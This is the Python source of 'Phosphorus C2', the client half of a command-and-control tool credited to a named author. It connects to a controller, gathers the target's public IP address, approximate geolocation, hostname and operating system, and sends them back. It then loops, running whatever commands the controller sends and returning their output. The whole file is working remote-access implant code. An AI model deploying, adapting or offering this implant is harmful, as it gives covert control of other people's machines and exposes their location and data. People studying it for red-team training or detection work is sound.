##############################################################################################################

# PHOSPHORUS C2
# Command & Control Client
# Brandon Burke
# Twitter = @Burke_Cyber

##############################################################################################################

# import: import libraries to use
from socket import *
import subprocess
from requests import get
from platform import system as plat_sys


# function: connect to the server
def connect():

    # variable: define HOST, PORT, ADDRESS, & BUFFER
    HOST = 'localhost'
    PORT = 9999
    ADDRESS = HOST, PORT
    BUFFER = 4096

    # variable: define client & connect to server ADDRESS
    client = socket(AF_INET, SOCK_STREAM)
    client.connect(ADDRESS)

    # return: return client & BUFFER for other functions to use
    return client, BUFFER


# function: send client information to the server such as IP, country, region, city, lat, long, hostname, & platform (OS)
def target_info(client):

    # variable: request client information in the form of JSON (dictionary) data
    data = get('https://ipwho.is/').json()

    # variable: define hostname, os, ip, country, region, city, lat, & long
    hostname = gethostname()
    os = plat_sys()
    ip = data['ip']
    country = data['country']
    region = data['region']
    city = data['city']
    lat = data['latitude']
    long = data['longitude']

    # variable: create a data variable to send back to the server
    data = f'IP: {ip}\nCountry: {country}\nRegion: {region}\nCity: {city}\nLatitude: {lat}\nLongitude: {long}\nHostname: {hostname}\nPlatform: {os}\n'.encode()

    # send: send data variable back to the server
    client.send(data)


# function: execute the command received from the server and send back the output of the command
def execute_command(client, command):

    # variable: take the input of command and split (list) based on spaces between words
    command = command.split()

    # error handle: try to run the command using subprocess & if it fails, then send and error message
    try:

        # variable: define command_output, run the command, & make a standard output to send to server
        command_output = subprocess.run(command, capture_output=True)
        command_output = command_output.stdout

        # if else: if the command_output is empty string, then send 'command executed' message
        # if else: else send the original output of the command to the server
        if command_output.decode() == '':
            command_output = 'Command executed.'.encode()
            client.send(command_output)
    
        else:
            client.send(command_output)

    except:
        message = 'Enter a valid or supported command.'.encode()
        client.send(message)


# function: call all functions above
def main():

    # variable: define client & BUFFER returned from function & pass into target_info()
    client, BUFFER = connect()
    target_info(client)

    # loop: while loop to constantly receive commands
    while True:

        # variable: decode the command received and pass into execute_command()
        command = client.recv(BUFFER).decode()

        # if else: if the command is 'exit' or '2' or '', then close the connection and break the loop
        # if else: else run the command through execute_command()
        if command == 'exit' or command == '2' or command == '':
            client.close()
            break

        else:
            execute_command(client, command)


# call the main function
if __name__ == '__main__':
    main()
